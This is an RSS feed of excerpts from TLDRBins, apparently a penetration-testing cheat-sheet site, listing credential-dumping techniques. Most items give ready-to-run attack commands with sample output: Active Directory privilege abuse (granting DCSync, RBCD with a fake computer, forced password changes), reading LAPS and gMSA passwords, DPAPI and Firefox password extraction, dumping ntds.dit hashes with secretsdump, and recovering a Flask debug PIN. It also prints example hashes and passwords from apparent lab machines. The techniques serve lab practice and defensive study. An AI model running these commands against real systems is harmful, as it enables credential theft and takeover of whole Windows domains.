<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Credential Dumping on TLDRBins</title>
    <link>https://tldrbins.github.io/@credential-dumping/</link>
    <description>Recent content in Credential Dumping on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@credential-dumping/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k -no-pass $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;rebound.htb/delegator$&amp;#39; -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] Getting machine hostname [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [*] Getting machine hostname AccountName AccountType DelegationType DelegationRightsTo SPN Exists ----------- ----------------------------------- -------------- --------------------- ---------- delegator$ ms-DS-Group-Managed-Service-Account Constrained http/dc01.</description>
    </item>
    <item>
      <title>DPAPI</title>
      <link>https://tldrbins.github.io/dpapi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dpapi/</guid>
      <description>Abuse #1: Credentials dump (From Linux) pypykatz DonPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Retrieve Keys # Get master key certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;MASTERKEY&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Base64 decode cat masterkey_b64 | base64 -d &amp;gt; masterkey_file # Get credential certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Base64 decode cat credential_b64 | base64 -d &amp;gt; credential_file 3.</description>
    </item>
    <item>
      <title>Firefox</title>
      <link>https://tldrbins.github.io/firefox/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firefox/</guid>
      <description>Browse History Windows # Locate sqlite $firefoxProfile = Get-ChildItem -Path &amp;#34;$env:APPDATA\Mozilla\Firefox\Profiles\&amp;#34; -Directory | Where-Object { $_.Name -like &amp;#34;*.default-release*&amp;#34; }; $historyDb = Join-Path $firefoxProfile.FullName &amp;#34;places.sqlite&amp;#34;; $historyDb Extract saved passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
    </item>
    <item>
      <title>GenericAll</title>
      <link>https://tldrbins.github.io/genericall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericall/</guid>
      <description>Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD&#xA;Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k &amp;#39;rebound.htb/oorend:1GR8t@$$4u&amp;#39; -dc-ip 10.10.11.231 -principal oorend -target-dn &amp;#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&amp;#39; -inheritance -action write -rights FullControl -use-ldaps Impacket v0.</description>
    </item>
    <item>
      <title>GenericWrite</title>
      <link>https://tldrbins.github.io/genericwrite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericwrite/</guid>
      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows # Enable Account (if Disabled) sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k remove uac &amp;lt;TARGET_USER&amp;gt; -f ACCOUNTDISABLE sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k add uac &amp;lt;TARGET_USER&amp;gt; -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.</description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt PS C:\programdata&amp;gt; .\rubeus.exe tgtdeleg /nowrap /ptt ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build &amp;#39;cifs/dc.</description>
    </item>
    <item>
      <title>Memory Dump</title>
      <link>https://tldrbins.github.io/memory_dump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/memory_dump/</guid>
      <description>Tools binwalk pypykatz # Extract files from memory dump binwalk -M -e &amp;lt;MEMORY_DUMP&amp;gt; Ref: binwalk&#xA;# Mini Dump pypykatz lsa minidump &amp;lt;MEMORY_DUMP&amp;gt; </description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M maq $ nxc ldap example.com -u &amp;#39;test.user&amp;#39; -p &amp;#39;Test1234&amp;#39; -M maq SMB 10.10.11.10 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False) LDAP 10.10.11.10 389 DC [+] example.com\test.user:Test1234 MAQ 10.10.11.10 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.11.10 389 DC MachineAccountQuota: 10 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
    </item>
    <item>
      <title>ReadGMSAPassword</title>
      <link>https://tldrbins.github.io/readgmsapassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
      <description>Abuse #1: Read GMSAPassword (From Linux) 1. Set Allowed to Retrieve the Password for this MSA [Optional] Set-ADServiceAccount -Identity &amp;#34;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#34; -PrincipalsAllowedToRetrieveManagedPassword &amp;#34;&amp;lt;USER&amp;gt;&amp;#34; 2. Read GMSA Password gMSADumper bloodyAD nxc # Password python3 gMSADumper.py -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; $ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: &amp;gt; DC$ &amp;gt; itsupport svc_int$:::745bd2c68dfc101a74f48d87027c7dc6 svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3 # NTLM python3 gMSADumper.</description>
    </item>
    <item>
      <title>ReadLAPSPassword</title>
      <link>https://tldrbins.github.io/readlapspassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readlapspassword/</guid>
      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b &amp;#39;DC=LicorDeBellota,DC=HTB&amp;#39; -x -D bob@LicorDeBellota.htb -w &amp;#39;Test1234!@&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base &amp;lt;DC=LicorDeBellota,DC=HTB&amp;gt; with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.</description>
    </item>
    <item>
      <title>Retrieve Flask Debug Pin</title>
      <link>https://tldrbins.github.io/retrieve_flask_debug_pin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/retrieve_flask_debug_pin/</guid>
      <description>Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) $ cat /proc/self/environ LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data ...[SNIP]... $ cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) LOGNAME=www-data USER=www-data 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ Traceback (most recent call last) File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app response = self.handle_exception(e) ...[SNIP]... 3. Get MAC address cat /sys/class/net/eth0/address $ cat /sys/class/net/eth0/address 00:50:56:b9:2e:50 # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.</description>
    </item>
    <item>
      <title>SeBackupPrivilege/SeRestorePrivilege</title>
      <link>https://tldrbins.github.io/sebackupprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; &amp;lt;DEST_DIR&amp;gt; &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;#39;&amp;lt;TARGET_FILE_PATH&amp;gt;&amp;#39; &amp;#39;C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt;&amp;#39; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh File set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
    </item>
    <item>
      <title>secretsdump</title>
      <link>https://tldrbins.github.io/secretsdump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secretsdump/</guid>
      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: .</description>
    </item>
    <item>
      <title>WriteDacl</title>
      <link>https://tldrbins.github.io/writedacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/writedacl/</guid>
      <description>Abuse #1: Add dcsync right to user Linux Windows powerview.py&#xA;1. Connect to DC # With password powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; # With hash powerview &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -H &amp;lt;HASH&amp;gt; $ powerview &amp;#39;CORP.LOCAL/WEB01$@172.16.1.5&amp;#39; -H 7ddf32e17a6ac5ce04a8ecbf782ca509 (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; 2. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -TargetIdentity &amp;#39;&amp;lt;TARGET_IDENTITY&amp;gt;&amp;#39; -Rights DCSync (LDAP)-[DC01.corp.local]-[CORP\WEB01$] PV &amp;gt; Add-DomainObjectAcl -PrincipalIdentity &amp;#39;WEB01$&amp;#39; -TargetIdentity &amp;#39;DC=corp,DC=local&amp;#39; -Rights DCSync [2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local [2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local [2024-10-01 12:51:36] DACL modified successfully!</description>
    </item>
  </channel>
</rss>
